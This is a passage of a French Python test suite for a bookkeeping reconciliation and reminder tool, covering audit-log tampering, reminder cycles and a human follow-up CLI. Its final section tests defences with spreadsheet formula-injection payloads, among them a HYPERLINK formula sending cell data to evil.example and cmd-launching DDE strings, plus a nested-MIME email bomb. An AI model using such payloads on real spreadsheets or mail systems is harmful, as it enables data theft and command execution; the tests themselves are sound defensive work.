        ["ALPHA", "2026-10-02", "CB LEROY MERLIN", "99.00", "A-010"],
    ])
    lancer(entree2, inst, jour(3))
    pieces = pieces_par_ref(inst)
    assert len(pieces) == 6                                   # aucune piece perdue
    assert all(pieces[r].nb_relances == 1 for r in REFS_MANQUANTES)
    assert pieces["A-010"].etat is EtatPiece.ATTENDUE


def test_piece_connue_devenue_hors_perimetre_ou_justifiee(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    entree2 = ecrire_entree(
        tmp_path / "e2",
        exclusions=[["ALPHA", "loxam", "Location refacturee au client"]],
        pieces=[["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR",
                 "2026-10-06", "email"]],
    )
    r = lancer(entree2, inst, jour(7))
    pieces = pieces_par_ref(inst)
    assert pieces["A-001"].etat is EtatPiece.HORS_PERIMETRE and r.pieces_exclues == 1
    a002 = pieces["A-002"]
    assert a002.etat is EtatPiece.DEMANDEE and a002.bloquee
    assert a002.motif_blocage.startswith(cycle.PREFIXE_MOTIF_CYCLE)
    alpha = [b for b in cycle.brouillons(inst) if b.cree_le == jour(7) and "ALPHA" in b.dossiers]
    assert alpha and all("A-001" not in b.references and "A-002" not in b.references for b in alpha)
    with open(inst.sortie / "a_verifier.csv", encoding="utf-8") as f:
        assert "A-002" in {l["reference"] for l in csv.DictReader(f)}
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(7)), dossier="ALPHA",
                              reference="A-002", id_piece="P-77")
    assert p.etat is EtatPiece.RECUE and not p.bloquee
    assert cycle.controler_piece(inst, "ALPHA", "A-002", VALIDEUSE, conforme=True,
                                 maintenant=a_10h(jour(7))).etat is EtatPiece.VALIDEE


# ---------------------------------------------------------------------------
# Audit
# ---------------------------------------------------------------------------


def test_verifier_audit_detecte_une_alteration(entree, inst):
    lancer(entree, inst, J0)
    cli = charger_cli()
    base = ["verifier-audit", "--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cycle.verifier_audit(inst).ok and cli.main(base) == 0
    lignes = inst.audit.read_bytes().split(b"\n")
    lignes[2] = lignes[2].replace(b"ALPHA", b"ALFA", 1)
    assert lignes[2] != inst.audit.read_bytes().split(b"\n")[2]
    inst.audit.write_bytes(b"\n".join(lignes))
    r = cycle.verifier_audit(inst)
    assert not r.ok and r.premiere_erreur_seq == 3
    assert cli.main(base) == 1


def test_audit_apres_la_transaction(entree, inst, monkeypatch):
    """Une transaction annulee ne laisse aucune trace d'audit (jamais l'inverse)."""
    original = Depot.sauver_pieces

    def en_panne(self, pieces):
        raise Panne("pieces")

    monkeypatch.setattr(Depot, "sauver_pieces", en_panne)
    with pytest.raises(Panne):
        lancer(entree, inst, J0)
    assert [e.action for e in JournalAudit(inst.audit).lire()] == []
    monkeypatch.setattr(Depot, "sauver_pieces", original)


# ---------------------------------------------------------------------------
# Corpus de reference (ordre de grandeur)
# ---------------------------------------------------------------------------


def test_corpus_de_reference(tmp_path):
    entree = RACINE / "data" / "corpus"
    inst = nouvelle_instance(tmp_path / "corpus")
    r = lancer(entree, inst, J0)
    assert r.operations == 284 and r.manquants == 23 and r.pieces_creees == 23
    assert r.a_verifier == 8 and r.brouillons_crees == 3 and r.anomalies == []
    assert emls(inst) == []
    with open(inst.sortie / "a_verifier.csv", encoding="utf-8") as f:
        a_verif = {l["reference"] for l in csv.DictReader(f)}
    assert len(a_verif) == 8
    references_reclamees = {ref for b in cycle.brouillons(inst) for ref in b.references}
    assert not a_verif & references_reclamees                 # PARTIEL / A_VERIFIER jamais relances
    assert not a_verif & set(pieces_par_ref(inst))
    assert verifier_ca07(entree, inst) == 23


def test_envoi_parti_puis_piece_justifiee_avant_la_repercussion(entree, tmp_path, inst):
    """Crash apres l'envoi, puis le moteur justifie la piece : l'envoi est quand meme compte."""
    lancer(entree, inst, J0)
    b = next(b for b in cycle.brouillons(inst) if b.destinataire == "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))

    def panne(p: str) -> None:
        raise Panne(p)

    with pytest.raises(Panne):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), panne=panne)
    entree2 = ecrire_entree(tmp_path / "e2", pieces=[
        ["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR", "2026-10-06", "email"],
    ])
    r = lancer(entree2, inst, jour(1))
    a002 = pieces_par_ref(inst)["A-002"]
    assert not [a for a in r.anomalies if "repercute" in a] and r.envois_repercutes == 1
    assert (a002.etat, a002.nb_relances, a002.bloquee) == (EtatPiece.DEMANDEE, 1, True)


# ---------------------------------------------------------------------------
# CA-03 et CA-11 au travers de l'assemblage
# ---------------------------------------------------------------------------


def test_ca03_jamais_de_rattachement_inter_dossiers(entree, inst):
    lancer(entree, inst, J0)
    # Le montant ne correspond qu'a une piece de BETA, mais l'expediteur est ALPHA.
    ecrire_eml(inst.entrant, "x.eml", expediteur="compta@alpha-sarl.fr", message_id="<x@a>",
               corps="Facture 230,40 EUR", fichiers=(("metro_2026-09-10.pdf", b"%PDF-x"),))
    lancer(entree, inst, jour(1))
    (d,) = cycle.lister_file(inst)
    assert d.statut is StatutRoutage.NON_ROUTEE and d.dossier == "ALPHA"
    assert d.reference_operation is None
    with pytest.raises(cycle.ErreurCycle):                     # NON_ROUTEE : pas de confirmation implicite
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(1)), message_id=d.message_id)


def test_ca11_export_complet_relu_sans_perte(entree, inst, tmp_path):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    chemin = cycle.exporter(inst, tmp_path / "export.json")
    copie = nouvelle_instance(tmp_path / "copie")
    with Depot(copie.depot) as d:
        d.importer_json(chemin)
    assert etat_depot(copie) == etat_depot(inst)


# ---------------------------------------------------------------------------
# Defauts trouves a l'integration. Les trois premiers sont corriges : leurs tests
# sont devenus des tests de regression. Les xfail stricts restants sont des
# limites ASSUMEES et documentees (docs/architecture_mvp.md, section 7).
# ---------------------------------------------------------------------------


def test_regression_relance_mixte_affirme_une_demande_qui_n_a_pas_eu_lieu():
    dossiers = {"A": Dossier("A", "Alpha SARL", "compta@alpha.fr", "M. Alpha")}
    j7 = J0 + dt.timedelta(days=7)
    deja = PieceAttendue("R1", "A", "2026-09", Decimal("120.00"), dt.date(2026, 9, 3), "CB LOXAM",
                         etat=EtatPiece.DEMANDEE, nb_relances=1, date_premiere_demande=J0,
                         date_derniere_relance=J0)
    neuve = PieceAttendue("R2", "A", "2026-10", Decimal("80.00"), dt.date(2026, 10, 8), "CB BUREAU VALLEE")
    plan = planifier([deja, neuve], dossiers, [], j7)
    (planifiee,) = plan.relances
    b = relances.construire_brouillon(planifiee, {"R1": deja, "R2": neuve}, dossiers, j7)
    affirme_demande = "demandes le" in b.corps
    assert not (affirme_demande and "BUREAU VALLEE" in b.corps.split("demandes le", 1)[1])


def test_regression_envoi_sans_garde_fou_hebdomadaire(tmp_path):
    depot = Depot(":memory:")
    journal = JournalAudit(tmp_path / "audit.jsonl")
    ids = []
    for refs in (("R1",), ("R2",)):
        b = Brouillon(identifiant_relance("c@x.fr", refs, 1, J0), "c@x.fr", "objet", "corps",
                      ("A",), refs, 1, J0)
        depot.sauver_brouillon(b)
        envoi.valider(depot, journal, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
        ids.append(b.id_relance)
    expediteur = envoi.ExpediteurDossier(tmp_path / "outbox")
    envoi.envoyer(depot, journal, expediteur, ids[0], maintenant=a_10h(J0))
    with pytest.raises(envoi.EnvoiNonValide):
        envoi.envoyer(depot, journal, expediteur, ids[1], maintenant=a_10h(J0))


def test_regression_parseurs_reference_de_repli_instable(tmp_path):
    inst = nouvelle_instance(tmp_path / "i")
    sept = ecrire_entree(tmp_path / "sept", operations=[["ALPHA", "2026-09-03", "CB LOXAM", "120.00", ""]])
    octo = ecrire_entree(tmp_path / "oct", operations=[["ALPHA", "2026-10-02", "CB CASTORAMA", "45.00", ""]])
    lancer(sept, inst, J0)
    lancer(octo, inst, jour(7))
    assert len(cycle.pieces(inst)) == 2


# ---------------------------------------------------------------------------
# Limites ASSUMEES (voir docs/architecture_mvp.md, section 7). xfail strict : le
# jour ou l'une est corrigee, le test devient rouge et rappelle de retirer le
# marqueur.
# ---------------------------------------------------------------------------


@pytest.mark.xfail(strict=True, reason=(
    "moteur.py : Moteur.rapprocher indexe `resultats` par reference seule ; deux "
    "operations de dossiers differents partageant une reference se confondent. "
    "Le cycle refuse donc les collisions AVANT le moteur. Correction prevue : cle "
    "composite (dossier, reference)."
))
def test_defaut_moteur_collision_de_reference_entre_dossiers():
    from rapprochement.modeles import OperationBancaire, Sens
    from rapprochement.moteur import Moteur

    def operation(dossier: str) -> OperationBancaire:
        return OperationBancaire(
            reference="R1",
            dossier=dossier,
            date_operation=dt.date(2026, 4, 12),
            libelle="PRLV ORANGE",
            montant=Decimal("89.90"),
            sens=Sens.DEBIT,
        )

    resultats = Moteur().rapprocher([operation("A"), operation("B")], [])
    assert sorted((r.operation.dossier, r.operation.reference) for r in resultats) == [
        ("A", "R1"),
        ("B", "R1"),
    ]


@pytest.mark.xfail(strict=True, reason=(
    "depot.py : marquer_vu horodate `vus.vu_le` avec l'horloge murale (_maintenant), "
    "sans parametre, et exporter_json exporte vu_le : deux depots alimentes des "
    "memes donnees produisent des exports differents (CA-08 non tenu pour "
    "`exporter`)."
))
def test_defaut_depot_export_non_reproductible(tmp_path, monkeypatch):
    import rapprochement.depot as depot_module

    exports = []
    for numero, instant in enumerate(
        (dt.datetime(2026, 4, 12, 9, 0, tzinfo=dt.timezone.utc),
         dt.datetime(2026, 4, 12, 9, 0, 7, tzinfo=dt.timezone.utc))
    ):
        monkeypatch.setattr(depot_module, "_maintenant", lambda instant=instant: instant)
        depot = Depot(tmp_path / f"depot{numero}.sqlite")
        depot.marquer_vu("cle-identique")
        chemin = depot.exporter_json(tmp_path / f"export{numero}.json")
        exports.append(Path(chemin).read_bytes())
        depot.fermer()
    assert exports[0] == exports[1]


# ---------------------------------------------------------------------------
# Suivi humain : promesse, arbitrage, blocage, liste des pieces
# ---------------------------------------------------------------------------


def actions_audit(inst: cycle.Instance) -> list[str]:
    return [e.action for e in JournalAudit(inst.audit).lire()]


def amener_a_l_escalade(entree: Path, inst: cycle.Instance) -> None:
    for n in (0, 7, 14):
        lancer(entree, inst, jour(n))
        valider_et_envoyer(inst, jour(n))
    lancer(entree, inst, jour(18))
    assert _etats(inst) == {(EtatPiece.ESCALADEE, 3)}


def cli(capsys, inst: cycle.Instance, commande: str, *args: str, date: dt.date | None = J0):
    options = ["--instance", str(inst.racine)]
    if date is not None:
        options += (["--le"] if commande == "promesse" else ["--date"]) + [date.isoformat()]
    rc = charger_cli().main([commande, *options, *args])
    sortie = capsys.readouterr()
    assert "Traceback" not in sortie.out + sortie.err
    return rc, sortie.out, sortie.err


def test_arbitrer_escaladee_jusqu_a_periode_complete(entree, inst):
    amener_a_l_escalade(entree, inst)
    suivi = cycle.suivi_pieces(inst, jour(18), etat="escaladee")
    assert len(suivi.lignes) == 5 and all("arbitrage" in l.action for l in suivi.lignes)
    p = cycle.arbitrer_piece(inst, "ALPHA", "A-003", "paul martin",
                             motif="Fournisseur liquide, montant non significatif",
                             maintenant=a_10h(jour(18)))
    assert p.etat is EtatPiece.CLOSE_SANS_SUITE
    toutes = cycle.pieces(inst)
    aout = [x for x in toutes if (x.dossier, x.periode) == ("ALPHA", "2026-08")]
    sept = [x for x in toutes if (x.dossier, x.periode) == ("ALPHA", "2026-09")]
    assert etats.etat_periode(aout) is EtatPeriode.COMPLETE
    assert etats.etat_periode(sept) is EtatPeriode.EN_COLLECTE
    periodes = {(d, per): e for d, per, e in cycle.suivi_pieces(inst, jour(18)).periodes}
    assert periodes[("ALPHA", "2026-08")] is EtatPeriode.COMPLETE

    journal = JournalAudit(inst.audit).lire()
    (arbitrage,) = [e for e in journal if e.action == "arbitrage"]
    assert arbitrage.acteur == "Paul Martin" and arbitrage.objet == "ALPHA/A-003"
    assert arbitrage.details["motif"].startswith("Fournisseur liquide")
    n = len(journal)
    cycle.arbitrer_piece(inst, "ALPHA", "A-003", VALIDEUSE, motif="rejeu",
                         maintenant=a_10h(jour(18)))                   # rejeu : sans effet
    assert len(JournalAudit(inst.audit).lire()) == n

    lancer(entree, inst, jour(21))
    assert [l["reference"] for l in lire_csv(inst.sortie / "escalades.csv")] == [
        "A-001", "A-002", "B-001", "G-001"]
    periodes_csv = {(l["dossier"], l["periode"]): l["etat"] for l in lire_csv(inst.sortie / "periodes.csv")}
    assert periodes_csv[("ALPHA", "2026-08")] == "complete"
    assert JournalAudit(inst.audit).verifier().ok


def test_arbitrer_refus(entree, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    avant, journal_avant = etat_depot(inst), actions_audit(inst)
    m = a_10h(J0)
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.arbitrer_piece(inst, "ALPHA", "A-001", "Mallory", motif="x", maintenant=m)
    with pytest.raises(cycle.ErreurCycle, match="introuvable"):
        cycle.arbitrer_piece(inst, "ALPHA", "Z-999", VALIDEUSE, motif="x", maintenant=m)
    with pytest.raises(cycle.ErreurCycle, match="motif"):
        cycle.arbitrer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="  ", maintenant=m)
    with pytest.raises(etats.TransitionInterdite, match="arbitrage_classement interdit depuis demandee"):
        cycle.arbitrer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="x", maintenant=m)
    assert etat_depot(inst) == avant and actions_audit(inst) == journal_avant


def test_promesse_puis_retour_en_demandee_trois_jours_ouvres_apres(entree, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    promise_le = dt.date(2026, 10, 9)                                  # vendredi
    p = cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=promise_le,
                              maintenant=a_10h(jour(2)))
    assert (p.etat, p.date_promesse) == (EtatPiece.PROMISE, promise_le)
    (entree_audit,) = [e for e in JournalAudit(inst.audit).lire() if e.action == "promesse_saisie"]
    assert entree_audit.acteur == VALIDEUSE
    suivi = {l.piece.reference: l for l in cycle.suivi_pieces(inst, jour(2)).lignes}
    assert suivi["A-001"].echeance == dt.date(2026, 10, 14)            # J+3 ouvres apres la date
    assert "promesse" in suivi["A-001"].action

    lancer(entree, inst, jour(7))                                      # lundi 12 : relance des autres
    nouveaux = [b for b in cycle.brouillons(inst) if b.cree_le == jour(7)]
    assert nouveaux and all("A-001" not in b.references for b in nouveaux)
    lancer(entree, inst, dt.date(2026, 10, 13))                        # 2e jour ouvre : encore promise
    assert pieces_par_ref(inst)["A-001"].etat is EtatPiece.PROMISE
    r = lancer(entree, inst, dt.date(2026, 10, 14))                    # 3e jour ouvre : retour
    a001 = pieces_par_ref(inst)["A-001"]
    assert r.transitions == 1
    assert (a001.etat, a001.date_promesse, a001.nb_relances) == (EtatPiece.DEMANDEE, None, 1)


def test_promesse_refus_et_rejeu(entree, inst):
    lancer(entree, inst, J0)
    m = a_10h(J0)
    with pytest.raises(etats.TransitionInterdite, match="promesse_saisie interdit depuis attendue"):
        cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(3), maintenant=m)
    valider_et_envoyer(inst, J0)
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.saisir_promesse(inst, "ALPHA", "A-001", "bot", date_promesse=jour(3), maintenant=m)
    with pytest.raises(cycle.ErreurCycle, match="introuvable"):
        cycle.saisir_promesse(inst, "BETA", "A-001", VALIDEUSE, date_promesse=jour(3), maintenant=m)
    with pytest.raises(etats.TransitionInterdite, match="hors de"):
        cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(20), maintenant=m)
    cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(3), maintenant=m)
    n = len(actions_audit(inst))
    cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(3), maintenant=m)
    assert len(actions_audit(inst)) == n                               # rejeu : sans effet
    with pytest.raises(etats.TransitionInterdite):                     # autre date : refus clair
        cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(4), maintenant=m)


def test_promesse_impossible_sur_une_piece_escaladee(entree, inst):
    """Constat (etats) : une fois ESCALADEE, une promesse obtenue par le responsable
    ne peut pas etre enregistree ; seuls arbitrer, rattacher ou exclure restent."""
    amener_a_l_escalade(entree, inst)
    with pytest.raises(etats.TransitionInterdite, match="promesse_saisie interdit depuis escaladee"):
        cycle.saisir_promesse(inst, "ALPHA", "A-001", VALIDEUSE, date_promesse=jour(20),
                              maintenant=a_10h(jour(18)))


def test_bloquer_puis_debloquer(entree, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    m3 = a_10h(jour(3))
    p = cycle.bloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif="Litige fournisseur", maintenant=m3)
    assert p.bloquee and p.motif_blocage == "Litige fournisseur"
    n = len(actions_audit(inst))
    cycle.bloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif="Litige fournisseur", maintenant=m3)
    assert len(actions_audit(inst)) == n                               # rejeu : sans effet
    with pytest.raises(etats.TransitionInterdite, match="bloquee"):
        cycle.bloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif="autre", maintenant=m3)
    with pytest.raises(cycle.ErreurCycle, match="reserve"):
        cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="[cycle] faux", maintenant=m3)
    with pytest.raises(cycle.ErreurCycle, match="motif"):
        cycle.bloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="", maintenant=m3)
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.debloquer_piece(inst, "ALPHA", "A-002", "Inconnu", motif="x", maintenant=m3)
    with pytest.raises(cycle.ErreurCycle, match="introuvable"):
        cycle.bloquer_piece(inst, "ALPHA", "NOPE", VALIDEUSE, motif="x", maintenant=m3)

    r7 = lancer(entree, inst, jour(7))                                 # bloquee : pas relancee
    (alpha,) = [b for b in cycle.brouillons(inst) if b.cree_le == jour(7) and "ALPHA" in b.dossiers]
    assert alpha.references == ("A-001", "A-003") and r7.bloquees == 1
    suivi = {l.piece.reference: l for l in cycle.suivi_pieces(inst, jour(7)).lignes}
    assert suivi["A-002"].echeance is None and "Litige fournisseur" in suivi["A-002"].action
    valider_et_envoyer(inst, jour(7))

    with pytest.raises(cycle.ErreurCycle, match="motif"):
        cycle.debloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif=" ", maintenant=a_10h(jour(7)))
    p = cycle.debloquer_piece(inst, "ALPHA", "A-002", "Paul Martin", motif="Litige regle",
                              maintenant=a_10h(jour(7)))
    assert not p.bloquee and p.motif_blocage == ""
    n = len(actions_audit(inst))
    cycle.debloquer_piece(inst, "ALPHA", "A-002", "Paul Martin", motif="Litige regle",
                          maintenant=a_10h(jour(7)))
    assert len(actions_audit(inst)) == n
    lancer(entree, inst, jour(14))                                     # de nouveau relancee
    assert any("A-002" in b.references for b in cycle.brouillons(inst) if b.cree_le == jour(14))
    acteurs = {(e.action, e.acteur) for e in JournalAudit(inst.audit).lire()}
    assert ("blocage", VALIDEUSE) in acteurs and ("deblocage", "Paul Martin") in acteurs


def test_debloquer_un_blocage_du_cycle_est_respecte(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    entree2 = ecrire_entree(tmp_path / "e2", pieces=[
        ["P-77", "ALPHA", "orange.pdf", "Orange Pro", "2026-09-15", "59.90", "EUR", "2026-10-06", "email"],
    ])
    lancer(entree2, inst, jour(7))
    assert pieces_par_ref(inst)["A-002"].bloquee
    cycle.debloquer_piece(inst, "ALPHA", "A-002", VALIDEUSE, motif="P-77 concerne une autre facture",
                          maintenant=a_10h(jour(7)))
    lancer(entree2, inst, jour(8))
    assert not pieces_par_ref(inst)["A-002"].bloquee


def test_pieces_lecture_seule_triee_et_echeances(entree, tmp_path, capsys):
    inst = nouvelle_instance(tmp_path / "sans_validateurs", validateurs=None)
    assert cycle.suivi_pieces(inst, J0).lignes == ()                    # instance vide
    lancer(entree, inst, J0)
    suivi = cycle.suivi_pieces(inst, J0)
    assert all("brouillon" in l.action for l in suivi.lignes)           # brouillons a valider
    avant, audit_avant = etat_depot(inst), inst.audit.read_bytes()
    rc, sortie1, _ = cli(capsys, inst, "pieces")
    rc2, sortie2, _ = cli(capsys, inst, "pieces")
    assert rc == rc2 == 0 and sortie1 == sortie2
    assert etat_depot(inst) == avant and inst.audit.read_bytes() == audit_avant
    lignes = [l for l in sortie1.splitlines() if l.startswith("  ") and "EUR" in l]
    assert [l.split()[1] for l in lignes] == ["A-003", "A-001", "A-002", "B-001", "G-001"]
    assert "ALPHA          2026-08 en_collecte" in sortie1

    rc, sortie, _ = cli(capsys, inst, "pieces", "--dossier", "BETA")
    assert rc == 0 and "B-001" in sortie and "A-001" not in sortie and "GAMMA" not in sortie
    rc, sortie, _ = cli(capsys, inst, "pieces", "--etat", "escaladee")
    assert rc == 0 and "Pieces attendues au 2026-10-05 : 0" in sortie
    rc, _, err = cli(capsys, inst, "pieces", "--etat", "perdue")
    assert rc == 1 and "etat inconnu" in err


def test_echeances_coherentes_avec_le_cycle(entree, inst):
    """L'echeance annoncee est le jour ou le cycle agit reellement."""
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    suivi = {l.piece.reference: l for l in cycle.suivi_pieces(inst, J0).lignes}
    assert suivi["A-001"].echeance == jour(7) and suivi["A-001"].action == "relance niveau 2"
    for n in (7, 14):
        lancer(entree, inst, jour(n))
        valider_et_envoyer(inst, jour(n))
    suivi = {l.piece.reference: l for l in cycle.suivi_pieces(inst, jour(14)).lignes}
    assert {(l.echeance, l.action) for l in suivi.values()} == {(jour(18), "escalade au responsable")}
    assert lancer(entree, inst, jour(17)).transitions == 0
    assert lancer(entree, inst, jour(18)).transitions == 5


def test_cli_suivi_humain(entree, inst, capsys):
    amener_a_l_escalade(entree, inst)
    j = jour(18)
    piece = ["--dossier", "ALPHA", "--reference"]
    # arbitrer
    assert cli(capsys, inst, "arbitrer", *piece, "A-003", "--motif", "x", "--par", "Mallory", date=j)[0] == 1
    rc, _, err = cli(capsys, inst, "arbitrer", *piece, "Z-9", "--motif", "x", "--par", VALIDEUSE, date=j)
    assert rc == 1 and "introuvable" in err
    rc, _, err = cli(capsys, inst, "arbitrer", *piece, "A-003", "--motif", "", "--par", VALIDEUSE, date=j)
    assert rc == 1 and "motif" in err
    rc, out, _ = cli(capsys, inst, "arbitrer", *piece, "A-003", "--motif", "classe", "--par", VALIDEUSE, date=j)
    assert rc == 0 and "close_sans_suite" in out
    rc, _, err = cli(capsys, inst, "arbitrer", "--dossier", "BETA", "--reference", "B-001",
                     "--motif", "x", "--par", VALIDEUSE, date=j)
    assert rc == 0
    # bloquer / debloquer sur une piece escaladee
    rc, out, _ = cli(capsys, inst, "bloquer", *piece, "A-001", "--motif", "litige", "--par", VALIDEUSE, date=j)
    assert rc == 0 and "(bloquee)" in out
    rc, _, err = cli(capsys, inst, "bloquer", *piece, "A-001", "--motif", "autre", "--par", VALIDEUSE, date=j)
    assert rc == 1 and "REFUS (TransitionInterdite)" in err
    assert cli(capsys, inst, "debloquer", *piece, "A-001", "--motif", "ok", "--par", "X", date=j)[0] == 1
    rc, out, _ = cli(capsys, inst, "debloquer", *piece, "A-001", "--motif", "ok", "--par", VALIDEUSE, date=j)
    assert rc == 0 and "(bloquee)" not in out
    rc, _, err = cli(capsys, inst, "bloquer", *piece, "A-404", "--motif", "x", "--par", VALIDEUSE, date=j)
    assert rc == 1 and "introuvable" in err
    # promesse : --date est la date promise, --le le jour courant
    rc, _, err = cli(capsys, inst, "promesse", *piece, "A-002", "--date", "2026-10-26",
                     "--par", VALIDEUSE, date=j)
    assert rc == 1 and "promesse_saisie interdit depuis escaladee" in err
    assert cli(capsys, inst, "promesse", *piece, "A-002", "--date", "2026-10-26",
               "--par", "Mallory", date=j)[0] == 1
    assert cli(capsys, inst, "promesse", *piece, "Z-1", "--date", "2026-10-26",
               "--par", VALIDEUSE, date=j)[0] == 1
    with pytest.raises(SystemExit):                                    # date illisible : argparse
        charger_cli().main(["promesse", "--instance", str(inst.racine), *piece, "A-002",
                            "--date", "2026-13-40", "--par", VALIDEUSE])
    with pytest.raises(SystemExit):                                    # --par obligatoire
        charger_cli().main(["arbitrer", "--instance", str(inst.racine), *piece, "A-002", "--motif", "x"])
    # pieces : l'etat calcule des periodes suit
    rc, out, _ = cli(capsys, inst, "pieces", date=j)
    assert rc == 0 and "ALPHA          2026-08 complete" in out and "BETA           2026-09 complete" in out
    assert JournalAudit(inst.audit).verifier().ok


def test_cli_promesse_succes(entree, inst, capsys):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    rc, out, _ = cli(capsys, inst, "promesse", "--dossier", "ALPHA", "--reference", "A-001",
                     "--date", "2026-10-09", "--par", "marie durand", date=jour(2))
    assert rc == 0 and "promise le 2026-10-09" in out
    rc, _, err = cli(capsys, inst, "promesse", "--dossier", "ALPHA", "--reference", "A-002",
                     "--date", "2026-12-01", "--par", VALIDEUSE, date=jour(2))
    assert rc == 1 and "hors de" in err


# ---------------------------------------------------------------------------
# Durcissement apres la revue adversariale (attaques reelles)
# ---------------------------------------------------------------------------

DECLENCHEURS = ("=", "+", "-", "@", "\t", "\r")


def _cellules_dangereuses(chemin: Path) -> list[str]:
    with open(chemin, encoding="utf-8", newline="") as f:
        cellules = [c for ligne in csv.reader(f) for c in ligne]
    return [c for c in cellules if c.startswith(DECLENCHEURS) and not _est_nombre(c)]


def _est_nombre(c: str) -> bool:
    try:
        Decimal(c)
    except Exception:
        return False
    return True


def _imbrique(n: int) -> bytes:
    corps = b"Content-Type: text/plain\r\n\r\nx\r\n"
    for _ in range(n):
        corps = b"Content-Type: message/rfc822\r\n\r\n" + corps
    return b"From: inconnu@evil.example\r\nMessage-ID: <bombe@x>\r\nMIME-Version: 1.0\r\n" + corps


def test_aucune_formule_de_tableur_dans_les_csv_du_cycle(tmp_path):
    formule = '=HYPERLINK("https://evil.example/?d="&A2,"Voir")'
    entree = ecrire_entree(tmp_path / "e", operations=[
        ["ALPHA", "2026-09-03", formule, "120.00", "A-001"],
        ["BETA", "2026-09-10", "@SUM(1+1)*cmd|' /C calc'!A0", "230.40", "B-001"],
    ])
    with open(entree / "releve_bancaire.csv", "a", newline="", encoding="utf-8") as f:
        csv.writer(f).writerow(["ALPHA", "2026-09-05", "2026-09-05", "+cmd|' /C calc'!A0", "",
                                "15.00", "EUR", "A-009"])       # credit -> a_verifier
    inst = nouvelle_instance(tmp_path / "i")
    with Depot(inst.depot) as d:                                  # piece escaladee piegee
        d.sauver_pieces([PieceAttendue(
            "G-001", "GAMMA", "2026-09", Decimal("145.00"), dt.date(2026, 9, 11), "-2+3*cmd",
            etat=EtatPiece.ESCALADEE, nb_relances=3, date_premiere_demande=dt.date(2026, 9, 14))])
    ecrire_eml(inst.entrant, "1.eml", expediteur="inconnu@evil.example", message_id="<p@x>",
               fichiers=(('=IMPORTXML(CONCAT("https:",B2),"a").pdf', b"%PDF"),))
    (inst.entrant / "=bombe.eml").write_bytes(_imbrique(1000))   # nom piege en quarantaine
    lancer(entree, inst, J0)
    fichiers = sorted(inst.sortie.glob("*.csv"))
    assert {f.name for f in fichiers} >= {"pieces_attendues.csv", "a_verifier.csv", "escalades.csv",
                                          "file_humaine.csv", "quarantaine.csv", "tableau_suivi.csv",
                                          "periodes.csv"}
    for f in fichiers:
        assert _cellules_dangereuses(f) == [], f.name
    assert lire_csv(inst.sortie / "file_humaine.csv")[0]["nom_fichier"].startswith("'=IMPORTXML")
    assert lire_csv(inst.sortie / "quarantaine.csv")[0]["nom_fichier"] == "'=bombe.eml"
    (escalade,) = lire_csv(inst.sortie / "escalades.csv")
    assert escalade["libelle"] == "'-2+3*cmd" and escalade["montant"] == "145.00"   # nombre intact


def test_routage_par_domaine_seulement_s_il_est_declare(tmp_path):
    def instance_avec(domaines_alpha: str) -> cycle.ResumeCycle:
        rep = tmp_path / (domaines_alpha or "aucun")
        entree = ecrire_entree(rep / "e")
        with open(entree / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact", "jour_echeance_tva",
                        "ton_relance", "circuit", "email_relais", "domaines"])
            for ligne in DOSSIERS:
                w.writerow([*ligne, domaines_alpha if ligne[0] == "ALPHA" else ""])
        inst = nouvelle_instance(rep / "i")
        ecrire_eml(inst.entrant, "1.eml", expediteur="comptable2@alpha-sarl.fr", message_id="<d@a>",
                   corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
        return lancer(entree, inst, J0), inst

    r, inst = instance_avec("alpha-sarl.fr")
    assert r.propositions == 1
    assert cycle.lister_file(inst)[0].reference_operation == "A-001"
    r, inst = instance_avec("")
    assert r.propositions == 0
    assert cycle.lister_file(inst)[0].motif is MotifNonRoute.DOSSIER_INCONNU


def test_eml_imbrique_mis_en_quarantaine_sans_bloquer_les_autres(entree, inst):
    bombe = _imbrique(1000)
    (inst.entrant / "0-bombe.eml").write_bytes(bombe)
    ecrire_eml(inst.entrant, "1.eml", expediteur="compta@alpha-sarl.fr", message_id="<ok@x>",
               corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF"),))
    r = lancer(entree, inst, J0)
